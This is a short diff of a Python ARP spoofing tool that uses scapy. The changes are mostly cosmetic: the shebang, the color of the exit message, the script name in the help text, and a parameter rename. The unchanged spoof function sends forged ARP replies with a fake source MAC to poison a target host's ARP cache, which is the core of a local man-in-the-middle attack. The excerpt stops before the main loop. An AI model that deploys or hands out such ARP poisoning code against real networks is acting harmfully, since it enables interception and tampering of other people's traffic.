@@ -1,24 +1,25 @@
-#!/usr/bin/env python3
-
+#!/usr/bin/env python 
 import scapy.all as scapy
 import argparse
-import time
-import sys
+import time 
+import sys 
 import signal 
-from termcolor import colored
+from termcolor import colored 
 
 def headler(sig,frame):
-    print(colored(f"\n\nSaliendo ..\n",'blue'))
+    print(colored(f"\n\nSaliendo ..\n\n",'yellow'))
     sys.exit(1)
+
 signal.signal(signal.SIGINT,headler)
+
 
 def get_arguments():
     parser = argparse.ArgumentParser(description="ARP SPOOF")
-    parser.add_argument("-t","--target",required=True,dest="ip_address",help="python3 arp_spoof2.py -t <IP-target>")
+    parser.add_argument("-t","--target",required=True,dest="ip_address",help="python3 Arp_Spoof.py -t <IP-target>")
     return parser.parse_args()
 
-def spoof(ip_address,spoof):
-    packet = scapy.ARP(op=2,psrc=spoof,pdst=ip_address,hwsrc="aa:bb:cc:11:22:33")
+def spoof(ip_address, spoof_ip):
+    packet = scapy.ARP(op=2,psrc=spoof_ip,pdst=ip_address,hwsrc="aa:bb:cc:11:22:33")
     scapy.send(packet,verbose=False)
 
 def main():
